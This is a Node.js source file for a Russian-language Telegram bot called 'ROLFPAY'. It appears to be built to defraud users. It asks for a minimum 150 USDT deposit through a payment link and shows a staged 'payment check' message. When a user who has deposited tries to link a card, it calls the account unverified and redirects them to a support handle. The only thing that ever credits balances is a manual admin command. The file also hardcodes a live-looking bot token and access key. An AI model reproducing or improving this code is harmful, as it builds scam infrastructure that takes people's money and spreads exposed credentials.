require("dotenv").config();

const API_KEY_BOT = '7343499202:AAEMbpNBudNwOU7D_slvIE6TyQMw5kQTSa0';
const ACCESS_KEY = 'AAFyizvudiwAchMfaXBJsZRA9e8QEoPwttM2';
const ADMIN_CHAT_ID = '7452921982';
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(API_KEY_BOT, { polling: true });

let users = {};

bot.on('message', msg => {
    const chatId = msg.chat.id;
    const userName = msg.from.first_name;

    if (!users[chatId]) {
        users[chatId] = {
            username: userName,
            registrationDate: new Date(),
            hasAccess: false,
            msgAddCardId: null,
            currency: 'USD', // default currency
            isDepositing: false, // состояние для отслеживания процесса пополнения 
            balance: 0 // добавляем баланс
        };

        // Send notification to admin about new user 
        const adminChatId = ADMIN_CHAT_ID;
        const newUserNotification = `Новый пользователь присоединился: ${userName} (ID: ${chatId})`;
        bot.sendMessage(adminChatId, newUserNotification);
    }

    if (msg.text === '/start') {
        if (users[chatId].hasAccess) {
            showMenu(chatId);
        } else {
            bot.sendMessage(chatId, "Введите ключ доступа: ");
        }
    } else if (msg.text === ACCESS_KEY) {
        users[chatId].hasAccess = true;
        bot.sendMessage(chatId, 'Доступ разрешен!', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Меню', callback_data: 'menu' }]
                ]
            }
        });
    } else if (msg.text === '💰 Пополнить Баланс') {
        users[chatId].isDepositing = true; // Устанавливаем состояние пополнения
        bot.sendMessage(chatId, 'Введите сумму депозита в USD:');
    } else if (users[chatId].isDepositing) {
        const depositAmount = parseFloat(msg.text);
        if (isNaN(depositAmount)) {
            bot.sendMessage(chatId, 'Пожалуйста, введите корректную сумму.');
        } else if (depositAmount < 150) {
            bot.sendMessage(chatId, 'Введите минимальный депозит 150');
        } else {
            const depositMessage = `Отправьте USDT на сумму: ${depositAmount} USDT \n`;
            const link = 't.me/send?start=IVmBXMuFZztw';
            bot.sendMessage(chatId, `${depositMessage}\n${link}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💸 Оплата отправлена', callback_data: 'deposit_accept' }],
                        [{ text: '🏠 Меню', callback_data: 'menu' }]
                    ]
                }
            });
            users[chatId].isDepositing = false; // Сбрасываем состояние после обработки 
        }
    } 
});

// Обработка команд администратора
bot.onText(/\/add_balance (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1]; // ID пользователя
    const amount = parseFloat(match[2]); // Сумма

    if (chatId.toString() === ADMIN_CHAT_ID) {
        if (users[userId]) {
            users[userId].balance += amount; // Увеличиваем баланс
            bot.sendMessage(userId, `Ваш баланс был увеличен на ${amount}. Новый баланс: ${users[userId].balance}`);
            bot.sendMessage(chatId, `Баланс пользователя ${userId} был увеличен на ${amount}.`);
        } else {
            bot.sendMessage(chatId, `Пользователь с ID ${userId} не найден.`);
        }
    } else {
        bot.sendMessage(chatId, 'У вас нет прав для выполнения этой команды.');
    }
});

bot.on('callback_query', query => {
    const chatId = query.message.chat.id;

    if (query.data === 'menu') {
        if (users[chatId].msgAddCardId) {
            bot.deleteMessage(chatId, users[chatId].msgAddCardId);
            delete users[chatId].msgAddCardId;
        }
        bot.deleteMessage(chatId, query.message.message_id);
        showMenu(chatId);
    } else if (query.data === 'add_card') {
        if (users[chatId].balance >= 150) {  
            bot.sendMessage(chatId, `Ваш аккаунт помечен неверифицированным. \nОтпишите саппорту для верификации: @garantROLFPAY`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: `🏠 Меню`, callback_data: 'menu' }]
                    ]
                }
            })
        }else { 
            bot.sendMessage(chatId, 'Привязка карт недоступна, внесите депозит.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: `🏠 Меню`, callback_data: 'menu' }]
                ]
            }
        })
        }
    } else if (query.data === 'deposit') {
        users[chatId].isDepositing = true; // Устанавливаем состояние пополнения 
        bot.sendMessage(chatId, 'Введите сумму депозита в USD:');
    } else if (query.data === 'my_deals') {
        bot.sendMessage(chatId, 'У вас пока нет сделок', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🏠 Меню', callback_data: 'menu' }]
                ]
            }
        });
    } else if (query.data === 'dollars' || query.data === 'rubles' || query.data === 'grivnes') {
        users[chatId].currency = query.data;
        showMenu(chatId);
    } else if (query.data === 'deposit_accept') {
        const adminChatId = ADMIN_CHAT_ID;
        const depositAmount = parseFloat(query.message.text.split('Отправьте USDT на сумму: ')[1].split(' USDT')[0]);
        const depositConfirmationMessage = `Пользователь с ID ${chatId} отправил депозит на сумму: ${depositAmount} USDT`;
        bot.deleteMessage(chatId, query.message.message_id);
        // Отправляем уведомление администратору
        bot.sendMessage(adminChatId, depositConfirmationMessage).then(() => {
            setTimeout(() => {
                bot.sendMessage(chatId, '💰 Проверка платежа...');
            }, 3000);
        });
    }
});

function showMenu(chatId) {
    const menuMessage = `
    ROLFPAY 

Добрый день!

Ваш баланс: ${users[chatId].balance}$
Ваши сделки: 0 
Ваши карты: 0 
    `;
    bot.sendMessage(chatId, menuMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💰 Пополнить Баланс', callback_data: 'deposit' }],
                [{ text: '📊 Мои Сделки', callback_data: 'my_deals' }],
                [{ text: '💳 Привязка карт', callback_data: 'add_card' }]
            ]
        }
    });
}
